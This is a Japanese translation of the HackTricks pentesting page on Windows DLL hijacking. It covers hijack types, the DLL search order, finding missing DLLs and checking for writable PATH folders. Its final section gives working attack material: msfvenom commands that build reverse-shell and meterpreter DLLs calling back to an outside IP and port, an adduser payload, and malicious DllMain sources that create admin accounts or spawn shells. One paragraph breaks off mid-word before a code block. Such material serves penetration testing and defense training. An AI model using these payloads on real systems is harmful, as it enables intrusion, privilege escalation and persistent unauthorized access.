# Dll Hijacking

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？**HackTricksで会社を宣伝**したいですか？または、**最新のPEASSバージョンにアクセス**したり、**HackTricksをPDFでダウンロード**したいですか？[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを手に入れましょう。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手しましょう。
* **[**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**にフォローしてください。**
* **ハッキングのコツを共有するために、**[**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks)と[**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

**ハッキングのキャリア**に興味があり、ハッキングできないものをハックしたい方 - **採用中です！** (_流暢なポーランド語の読み書きが必要です_).

{% embed url="https://www.stmcyber.com/careers" %}

## 定義

まず、定義から始めましょう。DLLハイジャックとは、広義には、**正当な/信頼されたアプリケーションに任意のDLLを読み込ませること**です。_DLL Search Order Hijacking_、_DLL Load Order Hijacking_、_DLL Spoofing_、_DLL Injection_、_DLL Side-Loading_ などの用語は、しばしば -誤って- 同じ意味で使われます。

Dllハイジャックは、**コードを実行**し、**永続性を獲得**し、**権限を昇格**させるために使用されます。これら3つの中で**最も見つかりにくい**のは、**権限昇格**です。しかし、これは権限昇格セクションの一部であるため、このオプションに焦点を当てます。また、目的に関係なく、dllハイジャックは同じ方法で実行されることに注意してください。

### タイプ

成功はアプリケーションが必要とするDLLをロードするために設定された方法に依存するため、選択するアプローチには**多様性**があります。可能なアプローチには以下が含まれます：

1. **DLLの置き換え**：正当なDLLを悪意のあるDLLに置き換えます。これは_DLL Proxying_と組み合わせることができ、元のDLLのすべての機能が保持されることを保証します。
2. **DLL検索順序ハイジャック**：パスなしでアプリケーションによって指定されたDLLは、特定の順序で固定された場所で検索されます。検索順序のハイジャックは、実際のDLLよりも前に検索される場所に悪意のあるDLLを置くことによって行われます。これには、ターゲットアプリケーションの作業ディレクトリが含まれることがあります。
3. **ファントムDLLハイジャック**：正当なアプリケーションがロードしようとする欠落している/存在しないDLLの代わりに悪意のあるDLLを配置します。
4. **DLLリダイレクション**：DLLが検索される場所を変更します。例えば、悪意のあるDLLを含むフォルダーを含めるように`%PATH%`環境変数を編集するか、`.exe.manifest` / `.exe.local`ファイルを編集します。
5. **WinSxS DLLの置き換え**：ターゲットDLLの関連するWinSxSフォルダー内の正当なDLLを悪意のあるDLLに置き換えます。これはしばしばDLLサイドローディングとして言及されます。
6. **相対パスDLLハイジャック**：正当なアプリケーションを悪意のあるDLLと一緒にユーザーが書き込み可能なフォルダーにコピー（およびオプションで名前を変更）します。これは使用方法により、(署名された)バイナリプロキシ実行と類似点があります。これの変種は、正当なアプリケーションが悪意のあるDLLと一緒に持ち込まれる（被害者のマシン上の正当な場所からコピーされるのではなく）という、やや矛盾した「_bring your own LOLbin_」と呼ばれることがあります。

## 不足しているDllの検出

システム内の不足しているDllを見つける最も一般的な方法は、sysinternalsから[procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)を実行し、**次の2つのフィルターを設定することです**：

![](<../../.gitbook/assets/image (311).png>)

![](<../../.gitbook/assets/image (313).png>)

そして、**ファイルシステムアクティビティ**だけを表示します：

![](<../../.gitbook/assets/image (314).png>)

一般に**不足しているdllを探している場合**は、これを**数秒間実行**しておきます。\
特定の実行可能ファイル内の**不足しているdllを探している場合**は、**"プロセス名" "contains" "\<exec name>"のような**別のフィルターを設定し、実行して、イベントのキャプチャを停止する必要があります。

## 不足しているDllの悪用

権限を昇格させるために、最善のチャンスは、特権プロセスが**検索される場所のいずれかでロードしようとするdllを書き込むことができる**ことです。したがって、**元のdllがあるフォルダーよりも前に検索されるフォルダー**にdllを**書き込むことができる**（珍しいケース）、または元のdllが存在しないフォルダーに**書き込むことができる**場合があります。

### Dll検索順序

**[**Microsoftのドキュメント**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching)内で、Dllが具体的にどのようにロードされるかを見ることができます。**

一般的に、**Windowsアプリケーション**は**事前に定義された検索パスを使用してDLLを見つけ**、これらのパスを特定の順序でチェックします。DLLハイジャックは通常、これらのフォルダーのいずれかに悪意のあるDLLを配置し、そのDLLが正当なものよりも先に見つかるようにすることで発生します。この問題は、アプリケーションが必要とするDLLへの絶対パスを指定することで軽減できます。

以下に32ビットシステムでの**DLL検索順序**を示します：

1. アプリケーションがロードされたディレクトリ。
2. システムディレクトリ。このディレクトリのパスを取得するには、[**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya)関数を使用します。（_C:\Windows\System32_）
3. 16ビットシステムディレクトリ。このディレクトリのパスを取得する関数はありませんが、検索されます。（_C:\Windows\System_）
4. Windowsディレクトリ。このディレクトリのパスを取得するには、[**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya)関数を使用します。
1. (_C:\Windows_)
5. 現在のディレクトリ。
6. PATH環境変数にリストされているディレクトリ。これには、**App Paths**レジストリキーによって指定されたアプリケーションごとのパスは含まれません。**App Paths**キーはDLL検索パスを計算するときには使用されません。

これが**SafeDllSearchMode**が有効になっているときの**デフォルト**の検索順序です。無効になっている場合、現在のディレクトリが2番目に昇格します。この機能を無効にするには、**HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode**レジストリ値を作成し、0に設定します（デフォルトは有効です）。

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa)関数が**LOAD\_WITH\_ALTERED\_SEARCH\_PATH**で呼び出されると、検索は**LoadLibraryEx**がロードしている実行可能モジュールのディレクトリから始まります。

最後に、**dllは絶対パスを指定してロードされることがあります**。その場合、そのdllは**そのパスでのみ検索されます**（dllに依存関係がある場合、それらは名前だけでロードされたかのように検索されます）。

ここでは説明しませんが、検索順序を変更する他の方法があります。

#### Windowsドキュメントからのdll検索順序の例外

* **同じモジュール名のDLLがすでにメモリにロードされている場合**、システムはリダイレクションとマニフェストのみをチェックし、そのDLLがどのディレクトリにあるかにかかわらず、ロードされたDLLに解決します。**システムはDLLを検索しません**。
* DLLがアプリケーションが実行されているWindowsのバージョンの**既知のDLLリスト**にある場合、システムはDLLを検索する代わりに、既知のDLLのコピーを使用します（および既知のDLLの依存するDLLがある場合はそれらも）。現在のシステムの既知のDLLのリストについては、次のレジストリキーを参照してください：**HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**。
* **DLLに依存関係がある場合**、システムは依存するDLLをモジュール名だけでロードされたかのように**検索します**。これは、最初のDLLが完全なパスを指定してロードされた場合でも当てはまります。

### 権限の昇格

**必要条件**：

* **他の権限**で実行される/実行されるプロセスを**見つける**こと（水平/横方向の移動）で、**dllが不足しています**。
* dllが**検索される**であろう**任意のフォルダー**に**書き込み権限**を持っている（おそらく実行可能ディレクトリまたはシステムパス内のいくつかのフォルダー）。

ええ、必要条件は複雑で、**デフォルトでは特権実行可能ファイルがdllを欠いていることを見つけるのは稀**ですし、システムパスフォルダーに書き込み権限を持っていることは**さらに珍しい**です（デフォルトではできません）。しかし、誤設定された環境ではこれが可能です。\
幸運にも要件を満たしている場合は、[UACME](https://github.com/hfiref0x/UACME)プロジェクトをチェックすることができます。**プロジェクトの主な目的はUACをバイパスすることですが**、書き込み権限を持っているフォルダーのパスを変更するだけで使用できるWindowsバージョンのDllハイ
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
And **PATH内のすべてのフォルダーの権限を確認します**：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
実行可能ファイルのインポートとdllのエクスポートを以下の方法で確認することもできます：
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
特権昇格のために **Dll Hijacking を悪用する** 完全ガイドについては、**System Path フォルダ**に書き込み権限がある場合は以下を確認してください：

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### 自動化ツール

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)は、システム PATH 内の任意のフォルダに対する書き込み権限があるかどうかをチェックします。
この脆弱性を発見するための他の興味深い自動化ツールには **PowerSploit 関数**があります：_Find-ProcessDLLHijack_、_Find-PathDLLHijack_、_Write-HijackDll_。

### 例

悪用可能なシナリオを見つけた場合、成功裏に悪用するための最も重要なことの一つは、**少なくとも実行可能ファイルがそれからインポートするすべての関数をエクスポートする dll を作成する**ことです。とにかく、Dll Hijacking は [Medium Integrity レベルから High **(UAC をバイパスして)**](../authentication-credentials-uac-and-efs.md#uac) または [**High Integrity から SYSTEM**](./#from-high-integrity-to-system) への昇格に便利です。**実行のための dll ハイジャックに焦点を当てたこの dll ハイジャック研究内で、**有効な dll の作成方法**の例を見つけることができます：[**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**。**
さらに、**次のセクショ**ンでは、**テンプレート**として役立つか、**必要ない関数をエクスポートする dll** を作成するための **基本的な dll コード**をいくつか見つけることができます。

## **Dll の作成とコンパイル**

### **Dll プロキシ化**

基本的に **Dll プロキシ** は、ロードされたときに **悪意のあるコードを実行する** 能力を持つと同時に、**すべての呼び出しを本物のライブラリにリレーすることで**、**期待されるように** 機能する Dll です。

ツール [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) または [**Spartacus**](https://github.com/Accenture/Spartacus) を使用すると、実際に **実行可能ファイルを指定してプロキシ化したいライブラリを選択し、プロキシ化された dll を生成** するか、**Dll を指定してプロキシ化された dll を生成** することができます。

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**メータープリーター (x86) を取得:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**ユーザーを作成する（x86版のみ、x64版は見当たらない）：**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 自分のもの

いくつかのケースでは、コンパイルするDllは、被害者プロセスによってロードされる**いくつかの関数をエクスポート**する必要があります。これらの関数が存在しない場合、**バイナリはそれらをロードできず**、**エクスプロイトは失敗します**。
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
```markdown
<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

**ハッキングキャリア**に興味があり、ハック不可能をハックしたい方 - **採用中です！** (_流暢なポーランド語の読み書きが必要です_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？**HackTricksで会社を宣伝**したいですか？または、**最新版のPEASSを入手**したり、**HackTricksをPDFでダウンロード**したいですか？[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをご覧ください。
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手してください。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加するか**、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**にフォローしてください。**
* **ハッキングのコツを共有するために、**[**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks)と[**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。**

</details>
```
